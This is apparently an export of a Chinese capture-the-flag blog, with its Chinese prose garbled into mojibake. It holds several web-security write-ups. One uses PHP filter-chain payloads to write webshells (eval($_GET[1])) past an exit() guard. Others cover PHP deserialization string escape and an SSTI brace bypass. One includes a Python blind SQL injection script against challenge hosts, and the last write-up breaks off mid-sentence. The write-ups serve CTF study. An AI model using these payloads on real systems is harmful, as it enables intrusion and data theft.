<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13/resource=shell.php&amp;txt=1?&lt;uc ciryn$(C_FB[G]1;)&gt;?</span></span><br></pre></td></tr></table></figure>

<p>è¿˜å¯ä»¥å°è¯•ä½¿ç”¨srtip_tags+base64çš„æ–¹å¼è¿›è¡Œç»•è¿‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">filename=php:<span class="comment">//filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&amp;txt=PD9waHAgcGhwaW5mbygpOyA/Pg==</span></span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è¯¥æ–¹å¼æ„é€ çš„payloadï¼Œä¼šè¿›è¡Œstrip_tagsï¼Œå»é™¤æ‰äº†å‰é¢çš„å†…å®¹ï¼Œä¹‹åå†ç”¨base64è§£å‹äº†æˆ‘ä»¬çš„å†…å®¹ã€‚</p>
<p>è®²å®Œä¸Šé¢çš„ï¼Œå†å›åˆ°wmctfçš„check in2ï¼Œé¢˜ç›®çš„æºç ä¸ºï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64|dechunk|\.\./i&#x27;</span>, $content))</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file_exists($content))</span><br><span class="line">        <span class="keyword">require_once</span>($content);</span><br><span class="line">    file_put_contents($content, <span class="string">&#x27;&lt;?php exit();&#x27;</span> . $content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤å™¨è¿‡æ»¤äº†å¾ˆå¤šï¼Œæˆ‘ä»¬åªå‰©ä¸‹äº†å‹ç¼©è¿‡æ»¤å™¨ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡zlib.inflateè§£å‹å­—ç¬¦ï¼Œä¹‹åå†åˆ©ç”¨zlib.deflateå‹ç¼©çš„æ–¹å¼getshellï¼Œstr.tolowerä¼šåœ¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/zlib.deflate|string.tolower|zlib.inflate|<span class="meta">?&gt;</span><span class="meta">&lt;?php</span>%0deval($_GET[1]);<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰äºŒæ¬¡ç¼–ç ç»•è¿‡çš„æ–¹å¼</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/?content=php://filter/write=string.%7%32ot13|<span class="meta">?&gt;</span><span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=shell.php</span></span><br></pre></td></tr></table></figure>

<p> è€Œæ˜¨å¤©çš„æ¯”èµ›è¿‡æ»¤äº†tolower,upperç­‰ç­‰ï¼Œç”šè‡³åˆæŠŠ%è¿‡æ»¤äº†ï¼Œå¯¼è‡´æˆ‘ä»¬æ²¡æ³•ç”¨ä¸Šé¢ä¸¤ä¸ªpayloadäº†ï¼Œä½†æ˜¯æˆ‘ä»¬ä¾ç„¶å¯ä»¥åˆ©ç”¨zlibçš„ deflateï¼Œä¹‹åå†åˆ©ç”¨urlç¼–ç è§£æï¼Œå¾—å‡ºå¦‚ä¸‹payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php:<span class="comment">//filter/write=string.strip_tags|zlib.inflate|%3F%3E%b3%b1%2f%c8%2</span></span><br><span class="line"><span class="number">8</span>%<span class="number">50</span>%<span class="number">28</span>%ae%<span class="number">2</span>c%<span class="number">2</span>e%<span class="number">49</span>%cd%d5%<span class="number">50</span>%<span class="number">89</span>%<span class="number">77</span>%<span class="number">77</span>%<span class="number">0</span>d%<span class="number">89</span>%<span class="number">8</span>e%<span class="number">8</span>f%d5%b4%b6%b7%<span class="number">03</span>%<span class="number">3</span>C%<span class="number">3</span>F/resourc</span><br><span class="line">e=shell.php </span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>BUU</tag>
      </tags>
  </entry>
  <entry>
    <title>ååºåˆ—åŒ–é€ƒé€¸</title>
    <url>/2020/11/20/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    <content><![CDATA[<p>ä¹Ÿç®—æ˜¯å¤šåšåšæ€»ç»“å§</p>
<h1 id="å˜é•¿"><a href="#å˜é•¿" class="headerlink" title="å˜é•¿"></a>å˜é•¿</h1><p>ä»ç½‘ä¸Šçœ‹æ¥çš„é‚£ä¹ˆä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;bb&#x27;</span>, <span class="string">&#x27;ccc&#x27;</span>, $str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name=<span class="string">&#x27;aaaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> $pass=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$AA=<span class="keyword">new</span> A();</span><br><span class="line">$res=filter(serialize($AA));</span><br><span class="line"><span class="keyword">echo</span> $res;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=unserialize($res);</span><br><span class="line"><span class="keyword">echo</span> $c-&gt;pass;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬éœ€è¦åšåˆ°çš„æ˜¯ï¼Œå¦‚ä½•ä¿®æ”¹$passçš„å€¼ï¼Ÿ</p>
<p>é¦–å…ˆå½“æˆ‘ä»¬åºåˆ—åŒ–ä¸€æ®µAçš„çš„è¯å¾—åˆ°çš„ç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:4:&quot;aaaa&quot;;s:4:&quot;pass&quot;;s:6:&quot;123456&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>å¹¶ä¸”æˆ‘ä»¬æ³¨æ„åˆ°å®ƒä¼šæŠŠbbå˜æˆcccï¼Œå½“ä»–åºåˆ—åŒ–çš„æ—¶å€™ï¼Œå·²ç»å®Œæˆäº†ï¼Œä½†æ˜¯ç»è¿‡è¿‡æ»¤ä¹‹åå®ƒçš„å­—ç¬¦ä¸²ä¼šå˜é•¿ï¼Œç»å†çš„æ˜¯è¿™ä¹ˆä¸€ä¸ªè¿‡ç¨‹:</p>
<p><img src="image-20201120203006883.png" alt="image-20201120203006883"></p>
<p>åŒæ—¶ï¼Œååºåˆ—åŒ–è¿˜æœ‰è¿™ä¹ˆä¸€ä¸ªç‰¹ç‚¹ï¼Œä¸€æ—¦è¯»å–åˆ°<code>&#125;</code>ï¼Œä»–å°±ä¼šåœæ­¢ï¼Œä¸ä¼šå†è¯»å–åé¢çš„å†…å®¹ï¼Œè¿™æ ·çš„è¯å°±å¾ˆå¥½è§£é‡Šäº†ï¼Œæˆ‘ä»¬æ„é€ payloadå¦‚ä¸‹ï¼š</p>
<p><img src="image-20201120203254613.png" alt="image-20201120203254613"></p>
<p>æˆåŠŸä¿®æ”¹äº†ç»“æœï¼</p>
<p>é‚£ä¹ˆå¦‚æœæ˜¯å˜çŸ­çš„æƒ…å†µä¸‹å‘¢ï¼Ÿ</p>
<h1 id="é•¿çŸ­çš„åŒºåˆ«ï¼š"><a href="#é•¿çŸ­çš„åŒºåˆ«ï¼š" class="headerlink" title="é•¿çŸ­çš„åŒºåˆ«ï¼š"></a>é•¿çŸ­çš„åŒºåˆ«ï¼š</h1><p>å’Œå‰é¢å˜é•¿çš„åŸç†æ˜¯<strong>ä¸ä¸€æ ·çš„</strong>ï¼Œåœ¨ååºåˆ—åŒ–é€ƒé€¸å˜é•¿çš„æƒ…å†µä¸‹ï¼Œä½ éœ€è¦åšçš„æ˜¯æ‹¼æ¥è‡ªå·±åé¢éœ€è¦å†™çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä½ æ‰€éœ€è¦è¡¥å……çš„é•¿åº¦=ä½ payloadçš„é•¿åº¦ï¼Œå¹¶ä¸”ä½ æ˜¯å†™åˆ°æœ«å°¾å‡ºç°<code>&#125;</code> ä¸ºæ­¢ï¼Œ<strong>ä»¥æ­¤æ¥ä½¿å¾—åé¢çš„å­—ç¬¦ä¸²ä¸§å¤±ä½œç”¨ï¼ï¼ï¼ï¼ï¼ï¼</strong>ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœæ˜¯å˜çŸ­çš„å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä½ éœ€è¦èƒ½å¤Ÿæ§åˆ¶<strong>ä¸¤ä¸ª</strong>å˜é‡ï¼</p>
<h1 id="å˜çŸ­ï¼š"><a href="#å˜çŸ­ï¼š" class="headerlink" title="å˜çŸ­ï¼š"></a>å˜çŸ­ï¼š</h1><p>è€Œå˜çŸ­åˆ™æˆªç„¶ä¸åŒï¼Œå¦‚æœä½ éœ€è¦å˜çŸ­ï¼Œä½ è¦åšçš„æ˜¯<strong>åƒæ‰ä½ æƒ³è¦ä¿®æ”¹çš„éƒ¨åˆ†çš„å‰é¢çš„partçš„å…¨éƒ¨</strong></p>
<p>æˆ‘ä»¬ä¸€æ ·çš„å…ˆçœ‹æ­£å¸¸çš„æƒ…å†µä¸‹æ˜¯å¦‚ä½•è¿›è¡Œåºåˆ—åŒ–çš„</p>
<p><img src="image-20201120203446153.png" alt="image-20201120203446153"></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:9:&quot;dasasdasd&quot;;s:4:&quot;pass&quot;;s:5:&quot;asdas&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæˆ‘ä»¬æƒ³è¦æ“ä½œpasså¯†ç éƒ¨åˆ†ï¼ˆæ§åˆ¶åé¢çš„18æ˜¯ä¸ºäº†æ§åˆ¶é•¿åº¦ï¼‰çš„è¯ï¼Œæˆ‘ä»¬è¦åƒæ‰çš„æ˜¯</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&quot;;s:4:&quot;pass&quot;;s:18:&quot;</span><br></pre></td></tr></table></figure>

<p>é‚£å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç®—ä¸€ç®—è¿™æ®µçš„é•¿åº¦å°±å¥½äº†ï¼ï¼ï¼ï¼ï¼ç®—å‡ºæ¥æ˜¯19ï¼Œé‚£æˆ‘ä»¬å†™38ä¸ªbï¼Œæ‹¼å‡ºæ¥å‰©ä½™19ä¸ªï¼Œä¹‹åå‘¢ï¼Œæˆ‘ä»¬å»å¤å†™å‰é¢çš„é‚£ä¸€æ®µçš„å†…å®¹å°±å¥½äº†ï¼</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;&#125;</span><br><span class="line">æ¯”å¦‚æ˜¯è¿™æ ·å“ˆï¼Œæˆ‘ä»¬å¦‚æœå†™19ä¸ªbbï¼Œè¿‡æ»¤ä¹‹åå‰©ä¸‹è¿™äº›ï¼Œè¿™æ ·çš„è¯åˆ°passå‰é¢çš„éƒ¨åˆ†éƒ½æ— äº†å®é™…ä¸Šè¿›å…¥çš„ä¹Ÿå°±å‰©ä¸‹</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc[ä¸­é—´çš„æ²¡äº†]&quot;;&#125;</span><br><span class="line">é‚£å‡è®¾æˆ‘ä»¬çš„passå†™æˆ:&quot;;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;,å†é‡æ–°æ‹¼æ¥ä¹‹åå°±å˜å˜æˆäº†ï¼</span><br><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc;s:4:&quot;pass&quot;;s:2:&quot;ab&quot;;&#125;&quot;;&#125;è¿™æ ·çš„è¯å°±åˆæ­£å¸¸äº†ï¼ï¼ï¼</span><br></pre></td></tr></table></figure>



<p>è¿‡æ»¤ä¹‹ååªå‰©ä¸‹ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">O:1:&quot;A&quot;:2:&#123;s:4:&quot;name&quot;;s:38:&quot;ccccccccccccccccccc&quot;;s:4:&quot;pass&quot;;s:4:&quot;asds&quot;;&#125;&quot;;&#125; </span><br></pre></td></tr></table></figure>

<p>ä¸€äº›é­”æœ¯æ–¹æ³•ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘</span><br><span class="line">__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘</span><br><span class="line">__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span><br><span class="line">__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span><br><span class="line">__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span><br><span class="line">__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span><br><span class="line">__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span><br><span class="line">__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span><br><span class="line">__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘,è¿”å›å€¼éœ€è¦ä¸ºå­—ç¬¦ä¸²</span><br><span class="line">__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span><br></pre></td></tr></table></figure>



]]></content>
      <tags>
        <tag>ååºåˆ—åŒ–</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>å¤ªæ¹–æ¯easyweb</title>
    <url>/2020/11/07/%E5%A4%AA%E6%B9%96%E6%9D%AFeasyweb/</url>
    <content><![CDATA[<p>æ„Ÿè§‰å¤ªæ¹–æ¯çš„é¢˜ç›®éƒ½æŒºéš¾çš„..è¿™æ¬¡è‡ªå·±åˆ¶ä½œå‡ºæ¥ä¸€é“é¢˜ï¼Œæ˜¯ä¸€é“SSTIï¼Œåšçš„æ—¶å€™ä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ˜¯nodejsè¿›è¡Œå‘½ä»¤æ‰§è¡Œä»€ä¹ˆçš„</p>
<h1 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h1><p>è¿™é“é¢˜çš„éš¾ç‚¹ä¸»è¦æ˜¯è¿‡æ»¤æ‰äº†èŠ±æ‹¬å·ï¼Œå’ŒåŒå¼•å·ç­‰ã€‚</p>
<h1 id="åšé¢˜æ€è·¯"><a href="#åšé¢˜æ€è·¯" class="headerlink" title="åšé¢˜æ€è·¯"></a>åšé¢˜æ€è·¯</h1><p>è¿™é“é¢˜åˆçœ‹å°±æ„Ÿè§‰æ˜¯ä¸€é“SSTIï¼Œä½†æ˜¯åˆšå¼€å§‹çš„æ—¶å€™è¢«èŠ±æ‹¬å·å¡ä½äº†ï¼Œæå¾—æˆ‘ä»¥ä¸ºæ˜¯æ˜¯å…¶ä»–é¢˜ç›®ï¼Œç»“æœç›¸å½“æƒ³åˆ°A1CTFç‹¬è§’å…½é‚£é“é¢˜ç›®ï¼Œæ‰æœ‰äº†æ€è·¯ï¼Œé¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ç¡®å®šçš„æ˜¯ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€äº›èŠ±é‡Œèƒ¡å“¨çš„ä¸œè¥¿ä¼šè¢«è½¬æ¢ä¸ºæ ‡å‡†çš„å­—ç¬¦ä¸²è¾“å‡ºï¼Œå¦‚å›¾ï¼š</p>
<p><img src="image-20201107195218392.png" alt="image-20201107195218392"></p>
<p>äºæ˜¯æˆ‘è”æƒ³åˆ°å¯ä»¥é€šè¿‡è¾“å…¥ç±»ä¼¼çš„èŠ±æ‹¬å·çš„utf8ç¼–ç ä¸‹çš„å­—ç¬¦ä¸²è¿›è¡Œç»•è¿‡ï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">https://www.compart.com/en/unicode/U+FE5C</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­è¿™ä¸€è¡Œ</p>
<table>
<thead>
<tr>
<th>UTF-8 Encoding:</th>
<th><code>0xEF 0xB9 0x9C</code></th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>æˆ‘ä»¬å°†0xä¿®æ”¹ä¸ºç™¾åˆ†å·å³å¯</p>
<p><img src="image-20201107195633976.png" alt="image-20201107195633976"></p>
<p>ä¹‹åå°±æ˜¯æ­£å¸¸çš„SSTIäº†ï¼Œæˆ‘ä»¬å°†ä¸éœ€è¦å¼•å·çš„payloadå¾€ä¸Šä¸Šä¸€ç”©å°±è¡Œäº†</p>
<p><img src="image-20201107195717338.png" alt="image-20201107195717338"></p>
<h1 id="äº‹å"><a href="#äº‹å" class="headerlink" title="äº‹å"></a>äº‹å</h1><p>äº‹åå‘ç°å…¶å®è¿˜å¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p>
<p><img src="image-20201107214148115.png" alt="image-20201107214148115"></p>
]]></content>
      <tags>
        <tag>æ¯”èµ›</tag>
      </tags>
  </entry>
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜FinalSql</title>
    <url>/2020/11/19/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98FinalSql/</url>
    <content><![CDATA[<h1 id="1-è€ƒç‚¹"><a href="#1-è€ƒç‚¹" class="headerlink" title="1.è€ƒç‚¹"></a>1.è€ƒç‚¹</h1><p>ç›²æ³¨,å­¦ä¹ åˆ°äº†æ–°çš„å§¿åŠ¿ï¼Œå½“æˆ‘ä»¬çš„ifè¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œå¯ä»¥é€šè¿‡^çš„æ–¹å¼æ¥æ“ä½œ</p>
<ul>
<li>?id=1=(è¡¨è¾¾å¼)=1</li>
<li>?id=1^(è¡¨è¾¾å¼)^1</li>
</ul>
<p>^ åœ¨mysqlå½“ä¸­ä»£è¡¨çš„æ˜¯ä½å¼‚æˆ–çš„æ„æ€ï¼Œå‘ƒï¼Ÿç™¾åº¦äº†ä¸€ä¸‹å¤§æ¦‚æ˜ç™½äº†ä¸€äº›</p>
<p>ä¸¤ä¸ªæ•°ç›¸åŒå¾—0ï¼Œä¸åŒå¾—1ï¼›é‚£æˆ‘ä»¬è¿›ä¸€æ­¥æ‹“å±•æ€è·¯ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸¤ä¸ªè¡¨è¾¾å¼ç›¸åŒçš„æ—¶å€™å°±ä¼šè¿”å›1ï¼Œä¸åŒçš„æ—¶å€™å°±ä¼šè¿”å›0</p>
<p>æ‹“å±•æ€è·¯ä¹‹åå¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š</p>
<p><img src="image-20201119170420138.png" alt="image-20201119170420138"></p>
<p>æ„Ÿè§‰è¿˜æ˜¯ç”¨ç­‰å·æ¯”è¾ƒå¥½ç†è§£å•Š</p>
<p>å½“ä¸¤ä¸ª=å·å¤¹åœ¨ä¸€èµ·çš„æ—¶å€™</p>
<p><img src="image-20201119172606372.png" alt="image-20201119172606372"></p>
<p>æ¡ä»¶æˆç«‹çš„æ—¶å€™å°±è¿”å›å‰é¢çš„åˆ¤æ–­ç»“æœï¼Œä¸æˆç«‹çš„è¯å°±è¿”å›å…¨éƒ¨çš„ç»“æœäº†ã€‚</p>
<p>äºæ˜¯æ„é€ æ³¨å…¥è¯­å¥ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(database(),1,1))&gt;102)&#x3D;1 </span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ•°æ®åº“çš„åå­—ï¼šgeek</p>
<p>æ¥ä¸‹æ¥æ³¨å…¥è¡¨åï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;92644a8a-ea2e-486b-baa0-eedd0947f835.node3.buuoj.cn&#x2F;search.php?id&#x3D;1&#x3D;(ascii(substr(select(group_concat(table_name)from(information_schema.tables) where(table_schema)&#x3D;database()),1,1))&gt;102)&#x3D;1 </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x3D;(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema&#x3D;&#39;geek&#39;)),1,1))&gt;1)&#x3D;1</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è¡¨åï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">F1naI1y,Flaaaaag</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥å­—æ®µåï¼š</p>
<p>id,username,password</p>
<p>flagåœ¨F1naI1yé‡Œé¢</p>
<p>æœ€ç»ˆexpï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, string, sys</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7e5cde2c-f8e0-4059-a2e2-6121476516cc.node3.buuoj.cn/search.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># data = &quot;id=if(ascii(  substr( database() ,1,1)  )&gt;100,1,2)#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># stringlist = string.digits + string.ascii_letters</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">999</span>):</span><br><span class="line">    <span class="comment"># for j in stringlist:</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>, <span class="number">126</span>):</span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;geek&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(i,j)</span></span><br><span class="line">        <span class="comment"># sql = &quot;1=(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;.format(</span></span><br><span class="line">        <span class="comment">#     i, j)</span></span><br><span class="line">        sql = <span class="string">&quot;1=(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)=1&quot;</span>.<span class="built_in">format</span>(i,j)</span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: sql&#125;</span><br><span class="line">        res = requests.get(url=url, params=data)</span><br><span class="line">        <span class="comment"># print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ingyingying~ Not this as wel&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(j)</span><br><span class="line">            flag += <span class="built_in">chr</span>(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">125</span>:</span><br><span class="line">            sys.exit()</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°ç­”æ¡ˆï¼š</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>çº¢æ˜è°·æ¯web</title>
    <url>/2021/04/02/%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AFweb/</url>
    <content><![CDATA[<h1 id="Happysql"><a href="#Happysql" class="headerlink" title="Happysql"></a>Happysql</h1><p>å‘œå‘œä¸€ç‚¹ä¹Ÿä¸æ¬¢ä¹ï¼Œè¿™ä¸ªé¢˜ç›®çœŸçš„æ¶å¿ƒå¿ƒï¼Œä¸è¿‡ä¸ç®—å¾ˆéš¾ï¼Œä¸»è¦æ˜¯å¾ˆä¹…æ²¡åšSQLäº†å¡ä½äº†å¾ˆä¹…ï¼š</p>
<p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯æ—¶é—´ç›²æ³¨çæŠ˜è…¾äº†å¾ˆä¹…ï¼Œå‘ç°è¿˜æ²¡ç”Ÿæ•ˆ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">concat</span>(rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>),rpad(<span class="number">1</span>,<span class="number">999999</span>,<span class="string">&quot;a&quot;</span>))<span class="comment">/**/</span>REGEXP<span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span><span class="comment">/**/</span><span class="string">&quot;(a.*)cd&quot;</span></span><br></pre></td></tr></table></figure>

<p>åæ¥æ‰çŸ¥é“æ˜¯åŒå¼•å·é—­åˆï¼Œä¹‹åæ˜¯å¸ƒå°”ç›²æ³¨ã€‚è¿‡æ»¤æŒºå¤šï¼Œ</p>
<ul>
<li>ç¬¦å·è¿‡æ»¤ï¼š = | &gt; | &lt;|ç©ºæ ¼|å•å¼•å·åŒå¼•å·  ç­‰ç­‰</li>
<li>å…³é”®è¯ï¼š or|and|mid|substr| like | ord </li>
</ul>
<p>æ—¢ç„¶ä¸èƒ½ç”¨ = å·çš„è¯æˆ‘ä»¬å¯ä»¥ç”¨regexpæ¥å°è¯•è¿›è¡Œç»•è¿‡ï¼Œéœ€è¦è¡¨åçš„è¯ä¹Ÿå¯ä»¥ä½¿ç”¨inæ¥ç»•è¿‡ï¼Œå•åŒå¼•å·çš„ç»•è¿‡æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åå…­è¿›åˆ¶çš„ç‰¹æ€§è¿›è¡Œç»•è¿‡ã€‚</p>
<p>æ‰€ä»¥ç¬¬ä¸€æ­¥æˆ‘ä»¬çš„payloadå¯ä»¥è¿™æ ·æ„é€ ï¼š</p>
